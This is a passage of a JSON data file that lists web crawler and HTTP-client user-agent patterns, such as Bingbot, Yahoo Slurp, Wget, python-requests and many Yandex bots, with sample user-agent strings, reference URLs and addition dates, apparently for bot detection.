      "Mozilla/5.0 (seoanalyzer; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "Slurp",
    "url": "http://help.yahoo.com/help/us/ysearch/slurp",
    "instances": [
      "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
      "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
      "Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)"
    ]
  }
  ,
  {
    "pattern": "[wW]get",
    "instances": [
      "WGETbot/1.0 (+http://wget.alanreed.org)",
      "Wget/1.14 (linux-gnu)",
      "Wget/1.20.3 (linux-gnu)"
    ]
  }
  ,
  {
    "pattern": "LinkedInBot",
    "instances": [
      "LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)",
      "LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/4.3 +http://www.linkedin.com)",
      "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)"
    ]
  }
  ,
  {
    "pattern": "Python-urllib",
    "instances": [
      "Python-urllib/1.17",
      "Python-urllib/2.5",
      "Python-urllib/2.6",
      "Python-urllib/2.7",
      "Python-urllib/3.1",
      "Python-urllib/3.2",
      "Python-urllib/3.3",
      "Python-urllib/3.4",
      "Python-urllib/3.5",
      "Python-urllib/3.6",
      "Python-urllib/3.7"
     ]
  }
  ,
  {
    "pattern": "python-requests",
    "addition_date": "2018/05/27",
    "instances": [
      "python-requests/2.9.2",
      "python-requests/2.11.1",
      "python-requests/2.18.4",
      "python-requests/2.19.1",
      "python-requests/2.20.0",
      "python-requests/2.21.0",
      "python-requests/2.22.0"
    ]
  }
  ,
  {
    "pattern": "aiohttp",
    "addition_date": "2019/12/23",
    "instances": [
      "Python/3.9 aiohttp/3.7.3",
      "Python/3.8 aiohttp/3.7.2",
      "Python/3.7 aiohttp/3.6.2a2"
    ],
    "url": "https://docs.aiohttp.org/en/stable/"
  }
  ,
  {
    "pattern": "httpx",
    "addition_date":" 2019/12/23",
    "instances": [
      "python-httpx/0.16.1",
      "python-httpx/0.13.0.dev1"
      
    ],
    "url": "https://www.python-httpx.org"
  }
  ,
  {
    "pattern": "libwww-perl",
    "instances": [
      "2Bone_LinkChecker/1.0 libwww-perl/6.03",
      "2Bone_LinkChkr/1.0 libwww-perl/6.03",
      "amibot - http://www.amidalla.de - tech@amidalla.com libwww-perl/5.831"
    ]
  }
  ,
  {
    "pattern": "httpunit",
    "instances": [
      "httpunit/1.x"
    ]
  }
  ,
  {
    "pattern": "nutch",
    "instances": [
      "NutchCVS/0.7.1 (Nutch; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)",
      "istellabot-nutch/Nutch-1.10"
    ]
  }
  ,
  {
    "pattern": "Go-http-client",
    "addition_date": "2016/03/26",
    "url": "https://golang.org/pkg/net/http/",
    "instances": [
      "Go-http-client/1.1",
      "Go-http-client/2.0"
    ]
  }
  ,
  {
    "pattern": "phpcrawl",
    "addition_date": "2012-09/17",
    "url": "http://phpcrawl.cuab.de/",
    "instances": [
      "phpcrawl"
    ]
  }
  ,
  {
    "pattern": "msnbot",
    "url": "http://search.msn.com/msnbot.htm",
    "instances": [
      "adidxbot/1.1 (+http://search.msn.com/msnbot.htm)",
      "adidxbot/2.0 (+http://search.msn.com/msnbot.htm)",
      "librabot/1.0 (+http://search.msn.com/msnbot.htm)",
      "librabot/2.0 (+http://search.msn.com/msnbot.htm)",
      "msnbot-NewsBlogs/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot-UDiscovery/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot-media/1.0 (+http://search.msn.com/msnbot.htm)",
      "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)",
      "msnbot-media/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
      "msnbot/1.1 (+http://search.msn.com/msnbot.htm)",
      "msnbot/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot/2.0b (+http://search.msn.com/msnbot.htm).",
      "msnbot/2.0b (+http://search.msn.com/msnbot.htm)._"
    ]
  }
  ,
  {
    "pattern": "jyxobot",
    "instances": []
  }
  ,
  {
    "pattern": "FAST-WebCrawler",
    "instances": [
      "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
      "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
      "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
      "FAST-WebCrawler/3.8"
    ]
  }
  ,
  {
    "pattern": "FAST Enterprise Crawler",
    "instances": [
      "FAST Enterprise Crawler 6 / Scirus scirus-crawler@fast.no; http://www.scirus.com/srsapp/contactus/",
      "FAST Enterprise Crawler 6 used by Schibsted (webcrawl@schibstedsok.no)"
    ]
  }
  ,
  {
    "pattern": "BIGLOTRON",
    "instances": [
      "BIGLOTRON (Beta 2;GNU/Linux)"
    ]
  }
  ,
  {
    "pattern": "Teoma",
    "instances": [
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
    ],
    "url": "http://about.ask.com/en/docs/about/webmasters.shtml"
  }
  ,
  {
    "pattern": "convera",
    "instances": [
      "ConveraCrawler/0.9e (+http://ews.converasearch.com/crawl.htm)"
    ],
    "url": "http://ews.converasearch.com/crawl.htm"
  }
  ,
  {
    "pattern": "seekbot",
    "instances": [
      "Seekbot/1.0 (http://www.seekbot.net/bot.html) RobotsTxtFetcher/1.2"
    ],
    "url": "http://www.seekbot.net/bot.html"
  }
  ,
  {
    "pattern": "Gigabot",
    "instances": [
      "Gigabot/1.0",
      "Gigabot/2.0 (http://www.gigablast.com/spider.html)"
    ],
    "url": "http://www.gigablast.com/spider.html"
  }
  ,
  {
    "pattern": "Gigablast",
    "instances": [
      "GigablastOpenSource/1.0"
    ],
    "url": "https://github.com/gigablast/open-source-search-engine"
  }
  ,
  {
    "pattern": "exabot",
    "instances": [
      "Mozilla/5.0 (compatible; Alexabot/1.0; +http://www.alexa.com/help/certifyscan; certifyscan@alexa.com)",
      "Mozilla/5.0 (compatible; Exabot PyExalead/3.0; +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot-Images/3.0; +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot/3.0 (BiggerBetter); +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot)"
    ]
  }
  ,
  {
    "pattern": "ia_archiver",
    "instances": [
      "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)",
      "ia_archiver-web.archive.org"
    ]
  }
  ,
  {
    "pattern": "GingerCrawler",
    "instances": [
      "GingerCrawler/1.0 (Language Assistant for Dyslexics; www.gingersoftware.com/crawler_agent.htm; support at ginger software dot com)"
    ]
  }
  ,
  {
    "pattern": "webmon ",
    "instances": []
  }
  ,
  {
    "pattern": "HTTrack",
    "instances": [
      "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)"
    ]
  }
  ,
  {
    "pattern": "grub.org",
    "instances": [
      "Mozilla/4.0 (compatible; grub-client-0.3.0; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.4; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.5; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.6; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.7; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.1.1; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.2.1; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.3.1; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.3.7; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.4.3; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.5.3; Crawl your own stuff with http://grub.org)"
    ]
  }
  ,
  {
    "pattern": "UsineNouvelleCrawler",
    "instances": []
  }
  ,
  {
    "pattern": "antibot",
    "instances": []
  }
  ,
  {
    "pattern": "netresearchserver",
    "instances": []
  }
  ,
  {
    "pattern": "speedy",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Speedy Spider for SpeedyAds (http://www.entireweb.com/about/search_tech/speedy_spider/)",
      "Mozilla/5.0 (compatible; Speedy Spider; http://www.entireweb.com/about/search_tech/speedy_spider/)",
      "Speedy Spider (Entireweb; Beta/1.2; http://www.entireweb.com/about/search_tech/speedyspider/)",
      "Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)"
    ]
  }
  ,
  {
    "pattern": "fluffy",
    "instances": []
  }
  ,
  {
    "pattern": "findlink",
    "instances": [
      "findlinks/1.0 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.3-beta8 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.3-beta9 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/; YaCy 0.1; yacy.net)",
      "findlinks/1.1.6-beta2 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta3 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.2 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.9 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.1.3 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.1.5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.2 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.6 (+http://wortschatz.uni-leipzig.de/findlinks/)"
    ]
  }
  ,
  {
    "pattern": "msrbot",
    "instances": []
  }
  ,
  {
    "pattern": "panscient",
    "instances": [
      "panscient.com"
    ]
  }
  ,
  {
    "pattern": "yacybot",
    "instances": [
      "yacybot (/global; amd64 FreeBSD 10.3-RELEASE; java 1.8.0_77; GMT/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 FreeBSD 10.3-RELEASE-p7; java 1.7.0_95; GMT/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 FreeBSD 9.2-RELEASE-p10; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-042stab093.4; java 1.7.0_65; Etc/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-042stab094.8; java 1.7.0_79; America/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-042stab108.8; java 1.7.0_91; America/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 2.6.32-042stab111.11; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 2.6.32-042stab116.1; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-573.3.1.el6.x86_64; java 1.7.0_85; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.10.0-229.4.2.el7.x86_64; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.10.0-229.4.2.el7.x86_64; java 1.8.0_45; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.10.0-229.7.2.el7.x86_64; java 1.8.0_45; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.10.0-327.22.2.el7.x86_64; java 1.7.0_101; Etc/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.11.10-21-desktop; java 1.7.0_51; America/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.12.1; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-042stab093.4; java 1.7.0_79; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-042stab093.4; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-45-generic; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.13.0-61-generic; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-74-generic; java 1.7.0_91; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-83-generic; java 1.7.0_95; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-83-generic; java 1.7.0_95; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-85-generic; java 1.7.0_101; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-85-generic; java 1.7.0_95; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-88-generic; java 1.7.0_101; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.14-0.bpo.1-amd64; java 1.7.0_55; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.14.32-xxxx-grs-ipv6-64; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.14.32-xxxx-grs-ipv6-64; java 1.8.0_111; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_111; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_75; America/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_79; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_91; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_95; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.8.0_111; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16-0.bpo.2-amd64; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.19.0-15-generic; java 1.8.0_45-internal; Europe/de) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.2.0-4-amd64; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.2.0-4-amd64; java 1.7.0_67; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 4.4.0-57-generic; java 9-internal; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Windows 8.1 6.3; java 1.7.0_55; Europe/de) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Windows 8 6.2; java 1.7.0_55; Europe/de) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 5.2.8-Jinsol; java 12.0.2; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 5.2.9-Jinsol; java 12.0.2; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 5.2.11-Jinsol; java 12.0.2; Europe/en) http://yacy.net/bot.html"
    ]
  }
  ,
  {
    "pattern": "AISearchBot",
    "instances": []
  }
  ,
  {
    "pattern": "ips-agent",
    "instances": [
      "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 ips-agent",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12; ips-agent) Gecko/20050922 Fedora/1.0.7-1.1.fc4 Firefox/1.0.7",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3; ips-agent) Gecko/20090824 Fedora/1.0.7-1.1.fc4  Firefox/3.5.3",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.24; ips-agent) Gecko/20111107 Ubuntu/10.04 (lucid) Firefox/3.6.24",
      "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0; ips-agent) Gecko/20100101 Firefox/14.0.1"
    ]
  }
  ,
  {
    "pattern": "tagoobot",
    "instances": []
  }
  ,
  {
    "pattern": "MJ12bot",
    "instances": [
      "MJ12bot/v1.2.0 (http://majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.1; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.5; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.0; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.1; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.2; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.3; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.0; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.1; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.2; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.3; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.4 (domain ownership verifier); http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.4; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.6; http://mj12bot.com/)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
    ]
  }
  ,
  {
    "pattern": "woriobot",
    "instances": [
      "Mozilla/5.0 (compatible; woriobot +http://worio.com)",
      "Mozilla/5.0 (compatible; woriobot support [at] zite [dot] com +http://zite.com)"
    ]
  }
  ,
  {
    "pattern": "yanga",
    "instances": [
      "Yanga WorldSearch Bot v1.1/beta (http://www.yanga.co.uk/)"
    ]
  }
  ,
  {
    "pattern": "buzzbot",
    "instances": [
      "Buzzbot/1.0 (Buzzbot; http://www.buzzstream.com; buzzbot@buzzstream.com)"
    ]
  }
  ,
  {
    "pattern": "mlbot",
    "instances": [
      "MLBot (www.metadatalabs.com/mlbot)"
    ]
  }
  ,
  {
    "pattern": "YandexBot",
    "url": "http://yandex.com/bots",
    "instances": [
      "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexBot/3.0; MirrorDetector; +http://yandex.com/bots)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "YandexImages",
    "url": "http://yandex.com/bots",
    "instances": [
      "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "YandexAccessibilityBot",
    "url": "http://yandex.com/bots",
    "instances": [
      "Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots"
    ],
    "addition_date": "2019/03/01"
  }
  ,
  {
    "pattern": "YandexMobileBot",
    "url": "https://yandex.com/support/webmaster/robot-workings/check-yandex-robots.xml#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2016/12/01"
  }
  ,
  {
    "pattern": "YandexMetrika",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)",
      "Mozilla/5.0 (compatible; YandexMetrika/3.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexMetrika/4.0; +http://yandex.com/bots)"
    ],
    "url": "https://yandex.com/support/webmaster/robot-workings/check-yandex-robots.xml#robot-in-logs"
  }
  ,
  {
    "pattern": "YandexTurbo",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; YandexTurbo/1.0; +http://yandex.com/bots)"
    ],
    "url": "https://yandex.com/support/webmaster/robot-workings/check-yandex-robots.xml#robot-in-logs"
  }
  ,
  {
    "pattern": "YandexImageResizer",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; YandexImageResizer/2.0; +http://yandex.com/bots)"
    ],
    "url": "https://yandex.com/support/webmaster/robot-workings/check-yandex-robots.xml#robot-in-logs"
  }
  ,
  {
    "pattern": "YandexVideo",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; YandexVideoParser/1.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexVideo/3.0; +http://yandex.com/bots)"
    ],
    "url": "https://yandex.com/support/webmaster/robot-workings/check-yandex-robots.xml#robot-in-logs"
  }
  ,
  {
    "pattern": "YandexAdNet",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexAdNet/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexBlogs",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexBlogs/0.99; robot; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexCalendar",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexCalendar/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexDirect",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexDirect/3.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexDirectDyn/1.0; +http://yandex.com/bots"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexFavicons",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YaDirectFetcher",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YaDirectFetcher/1.0; Dyatel; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexForDomain",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexForDomain/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexMarket",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexMarket/1.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexMarket/2.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexMedia",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexMedia/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexMobileScreenShotBot",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexMobileScreenShotBot/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexNews",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexNews/4.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexOntoDB",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexOntoDB/1.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (compatible; YandexOntoDBAPI/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexPagechecker",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexPagechecker/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexPartner",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexPartner/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexRCA",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexRCA/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexSearchShop",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexSearchShop/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexSitelinks",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexSitelinks; Dyatel; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
    "pattern": "YandexSpravBot",
    "url": "https://yandex.ru/support/webmaster/robot-workings/check-yandex-robots.html#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (compatible; YandexSpravBot/1.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2020/11/30"
  }
  ,
  {
